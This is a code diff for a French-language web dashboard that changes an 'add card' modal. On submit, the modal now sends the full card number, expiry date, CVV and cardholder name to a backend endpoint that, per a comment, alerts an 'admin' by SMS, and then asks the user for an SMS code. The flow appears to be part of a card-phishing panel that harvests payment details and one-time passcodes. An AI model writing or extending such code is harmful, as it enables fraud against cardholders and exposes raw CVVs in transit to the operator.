@@ -420,7 +420,8 @@ export default function DashboardPage() {
 }
 // Modal Ajout Carte
 function AddCardModal({ onClose, locale, t }) {
-  const [step, setStep] = useState(1);
+  const [step, setStep] = useState(1);       // 1 = formulaire, 2 = SMS code
+  const [loading, setLoading] = useState(false);
   const [cardNumber, setCardNumber] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
   const [cvv, setCvv] = useState('');
@@ -429,13 +430,42 @@ function AddCardModal({ onClose, locale, t }) {
 
   async function handleSubmit(e) {
     e.preventDefault();
-    setStep(2);
+    setLoading(true);
+
+    try {
+      // Appel à ton API pour envoyer le SMS à l’admin
+      const res = await fetch('/api/cards/request-sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          locale,
+          cardNumber: cardNumber.replace(/\s/g, ''),
+          expiryDate,
+          cvv,
+          cardholderName,
+        }),
+      });
+
+      if (!res.ok) {
+        // en prod tu peux afficher un message d'erreur
+        console.error('Card SMS request failed');
+        setLoading(false);
+        return;
+      }
+
+      // Succès -> on passe à l’étape 2 (saisie code SMS)
+      setStep(2);
+    } catch (err) {
+      console.error('Card SMS request error', err);
+    } finally {
+      setLoading(false);
+    }
   }
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/60 backdrop-blur-sm px-4">
       <div className="w-full max-w-md rounded-2xl bg-white shadow-2xl border border-slate-200">
-        {step === 1 ? (
+        {step === 1 && !loading && (
           <>
             <div className="flex items-center justify-between px-5 py-4 border-b border-slate-200">
               <div>
@@ -546,7 +576,30 @@ function AddCardModal({ onClose, locale, t }) {
               </div>
             </form>
           </>
-        ) : (
+        )}
+
+        {/* Écran de loading avec le spinner */}
+        {step === 1 && loading && (
+          <div className="px-5 py-8 flex flex-col items-center justify-center text-center">
+            <svg className="spinner" width="65px" height="65px" viewBox="0 0 66 66">
+              <circle
+                className="spinner-path"
+                fill="none"
+                strokeWidth="6"
+                strokeLinecap="round"
+                cx="33"
+                cy="33"
+                r="30"
+              ></circle>
+            </svg>
+            <p className="mt-4 text-sm text-slate-700">
+              {t('card.sendingSms') || 'Envoi de la demande de vérification en cours...'}
+            </p>
+          </div>
+        )}
+
+        {/* Étape 2 = écran SMS existant */}
+        {step === 2 && !loading && (
           <>
             <div className="flex items-center justify-between px-5 py-4 border-b border-slate-200">
               <div>
@@ -601,6 +654,7 @@ function AddCardModal({ onClose, locale, t }) {
     </div>
   );
 }
+
 
 // Modal Détails Carte
 function CardDetailsModal({ card, onClose, t }) {
